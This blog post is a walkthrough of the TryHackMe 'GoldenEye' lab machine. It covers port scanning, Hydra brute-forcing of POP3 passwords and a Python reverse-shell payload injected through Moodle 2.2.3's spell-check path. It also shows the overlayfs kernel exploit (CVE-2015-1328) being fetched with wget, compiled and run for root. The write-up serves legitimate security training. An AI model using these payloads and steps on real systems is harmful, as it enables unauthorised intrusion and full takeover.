---
layout: post
current: post
cover: 'assets/images/goldeneye/cover.png'
navigation: True
title: "GoldenEye Write Up"
date: 2021-06-27 00:00:00
tags: [tryhackme, ctf, medium]
class: post-template
subclass: 'post'
author: darryn
---
![cover](/assets/images/goldeneye/cover.png)

### Overview

[goldeneye](https://tryhackme.com/room/goldeneye) is a medium rated CTF room on [TryHackMe](https://tryhackme.com). The machine was pretty easy, it just needed good enumeration.

### Nmap

I deployed the machine and started a NMAP scan to check the available ports. 

```highlight
└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.50.94
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:39 BST
Nmap scan report for 10.10.50.94
Host is up (0.031s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
|_ssl-date: TLS randomness does not represent time
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.44 seconds
```

2 Ports open:

- 25 - smtp - Postfix smtpd
- 80 - HTTP - Apache httpd 2.4.7

I ran a full port scan and found 2 more ports.

```highlight
└──╼ $sudo nmap -p- -oA nmap/allports 10.10.50.94
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:40 BST
Nmap scan report for 10.10.50.94
Host is up (0.034s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
55006/tcp open  unknown
55007/tcp open  unknown
```

I then completed a targeted scan against the 4 ports.

```highlight
└──╼ $sudo nmap -p 25,80,55006,55007 -sC -sV -oA nmap/targeted 10.10.50.94
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-27 11:54 BST
Nmap scan report for 10.10.50.94
Host is up (0.030s latency).

PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL USER RESP-CODES AUTH-RESP-CODE SASL(PLAIN) CAPA STLS PIPELINING TOP
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.38 seconds
```

### Web Enumeration

I started by looking at the HTTP port.

![webpage](/assets/images/goldeneye/webpage.png)

The webpage tells us to go to /sev-home/ however the page is password protected and currently I have no usernames or password.

![loginprompt](/assets/images/goldeneye/loginprompt.png)

I checked the source code for the webpage.

```highlight
<html>
<head>
<title>GoldenEye Primary Admin Server</title>
<link rel="stylesheet" href="index.css">
</head>

	<span id="GoldenEyeText" class="typeing"></span><span class='blinker'>&#32;</span>

<script src="terminal.js"></script>
	
</html>
```

Not a great deal in there but there is a javascript file.

```highlight
var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}
```

Few things to note in here, we have 2 names (boris, natalya) and an encoded password. I went to [Cyber Chef](https://gchq.github.io/CyberChef/) to decode the password. Using the magic function the string is decoded from HTLM Entity to clear text.

![cyberchefjscode](/assets/images/goldeneye/cyberchefjscode.png)

Using the the username 'boris' and password from cyberchef I can now login to the webpage.

![loggedinwebpage](/assets/images/goldeneye/loggedinwebpage.png)

> GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)
>
> Please email a qualified GNO supervisor to receive the online **GoldenEye Operators Training** to become an Administrator of the GoldenEye system
>
> Remember, since **_security by obscurity_** is very effective, we have configured our pop3 service to run on a very high non-default port

Its now time to turn attention to the smtp/pop3 ports.

### Email Enumeration

Reviewing the nmap output, port 25 SMTP allows the VRFY command however not AUTH. Port 55007 POP3 does allow authentication, I tried to login using the credentials found for boris but they didnt work.

![pop3boris](/assets/images/goldeneye/pop3boris.png)

Using Hydra I was able to brute force boris's password.

> Normaly I would use rockyou.txt however after around 30 minutes I had no hits so swapped to the much smaller wordlist fasttrack and got a hit after a minute or so.

```highlight
└──╼ $hydra -l boris -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:00:47
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.10.50.94:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
[55007][pop3] host: 10.10.50.94   login: boris   password: <<redacted>>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:03:34
```

I repeated the process for natalya.

```highlight
└──╼ $hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:05:44
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.10.50.94:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[55007][pop3] host: 10.10.50.94   login: natalya   password: <<redacted>>
[STATUS] 111.00 tries/min, 222 tries in 00:02h, 1 to do in 00:01h, 15 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:07:45
```

Now I had some credentials it was time to login and check for any email messages, to do this I used netcat to connect to the POP3 service and authentication and use the 'LIST' and 'RETR' commands to list and retrieve messages.

> A list of POP3 commands can be found [here](https://www.shellhacks.com/retrieve-email-pop3-server-command-line/)

```highlight
└──╼ $nc 10.10.50.94 55007
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS <<redacted>>
+OK Logged in.
list
+OK 3 messages:
1 544
2 373
3 921
.
RETR 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the ot
her admins here.
.
RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this s
erver then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and capture
d our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

.
```

I repeated the same process for natalya.

```highlight
└──╼ $nc 10.10.50.94 55007
+OK GoldenEye POP3 Electronic-Mail System
user natalya
+OK
pass <<redacted>>
+OK Logged in.
list
+OK 2 messages:
1 631
2 1048
.
retr 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even
 if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: <<redacted>>

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.


.

```

Great more credentials and a new HTTP endpoint. I added the details to my /etc/hosts file and navigated to http://severnaya-station.com/gnocertdir/

![moodle](/assets/images/goldeneye/moodle.png)

Logging in as xenia a message notification popped up, using the notification I was navigated to the users messages.

![xeniamessage](/assets/images/goldeneye/xeniamessage.png)

A new email username is 'doak'

```highlight
└──╼ $hydra -l doak -P /usr/share/wordlists/fasttrack.txt -s 55007 10.10.50.94 pop3
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-27 12:16:54
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.10.50.94:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
[55007][pop3] host: 10.10.50.94   login: doak   password: goat
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-27 12:19:23
```

Repeating the same process as before, I brute forced the users password and logged in to POP3 service to check for messages.

```highlight
└──╼ $nc 10.10.50.94 55007
+OK GoldenEye POP3 Electronic-Mail System
user doak
+OK
pass <<redacted>>
+OK Logged in.
list
+OK 1 messages:
1 606
.
RETR 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: <<redacted>>

.
```

I logged out of http://severnaya-station.com/gnocertdir/ as xenia and logged in as dr_doak. Looking around the webpage I found private files for james.

![privatefiles](/assets/images/goldeneye/privatefiles.png)

I downloaded the file to my machine.

```highlight
└──╼ $cat s3cret.txt 
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

Navigating to http://severnaya-station.com/dir007key/for-007.jpg I found an image:

![007](/assets/images/goldeneye/for-007.jpg)

I downloaded the file and used exiftools to check for any credentials.

```highlight
└──╼ $exiftool for-007.jpg 
ExifTool Version Number         : 11.97
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2021:06:27 12:27:18+01:00
File Access Date/Time           : 2021:06:27 12:27:18+01:00
File Inode Change Date/Time     : 2021:06:27 12:27:18+01:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066
```

The image description looks like base64 so using the command ```echo -n "eFdpbnRlcjE5OTV4IQ==" | base64 -d``` I was able to retrieve the admin password.

### Shell

As an admin on moodle we get a lot more options, the moodle version is 2.2.3, googleing for 'moodle 2.2.3 exploit', the first result provides an [exploit](https://www.rapid7.com/db/modules/exploit/multi/http/moodle_cmd_exec/) using the spell check function. Reading the source code it looks fairly straight forward so I decided to do manualy rather than use Metasploit.

First I updated the system path with the payload ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<<local machine IP>>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

![systempath](/assets/images/goldeneye/systempath.png)

Next I changed the shell engine to use 'PSpellShell'.

![updatedshell](/assets/images/goldeneye/updatedshell.png)

I started a netcat listener on my local machine and then on the webpage went to add a post, once the editor loaded and clicked spell check and got a shell!

![spellcheck](/assets/images/goldeneye/spellcheck.png)

```highlight
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [<<REDACTED>>] from (UNKNOWN) [10.10.50.94] 55215
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

### Priv Esc	

The machine is running linux 3.13.0-32, googeling linux 3.13.0-32 priv esc I found a linux kernal exploit. Details of the exploit can be found [here](https://www.cvedetails.com/cve/cve-2015-1328).

> The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace. 

I downloaded the [exploit code](https://www.exploit-db.com/exploits/37292) from exploit-db and copied it to machine using python.

##### My machine
```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
└──╼ $mv ~/Downloads/37292.c .
┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
└──╼ $ls
37292.c  for-007.jpg  nmap  s3cret.txt
┌─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
└──╼ $mv 37292.c exploit.c
┌─[✗]─[daz@parrot]─[~/Documents/TryHackMe/GoldenEye]
└──╼ $sudo python3 -m http.server 80
[sudo] password for daz: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

##### Victim
```highlight
www-data@ubuntu:/tmp$ wget http://<<machine IP>>/exploit.c
--2021-06-27 04:54:42--  http://<<machine IP>>/exploit.c
Connecting to <<machine IP>>:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/x-csrc]
Saving to: 'exploit.c'

100%[======================================>] 5,119       --.-K/s   in 0.003s

2021-06-27 04:54:42 (1.83 MB/s) - 'exploit.c' saved [5119/5119]

www-data@ubuntu:/tmp$ 
```

The code provides the compile intructions, I simply need to run gcc and specific the output flag.

```highlight
www-data@ubuntu:/tmp$ gcc exploit.c exploit
The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
www-data@ubuntu:/tmp$ 
```

GCC is not installed however I can use 'cc'. However for the exploit to work I need to change a line in the file to reference cc rather than gcc.

```lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");```

Now the line has changed I can use cc to compile the code.

```highlight
www-data@ubuntu:/tmp$ cc exploit.c -o exploit
exploit.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
exploit.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
exploit.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
exploit.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
exploit.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
```

A few warmming messages are generated however the exploit still works and we get a root shell!

```highlight
www-data@ubuntu:/tmp$ ./exploit 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# 
```

Thanks for reading!

============================================================

Any comments or feedback welcome! You can find me on [twitter](https://twitter.com/dazbrownfield).

<a href="https://www.buymeacoffee.com/dazbrownfield" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>

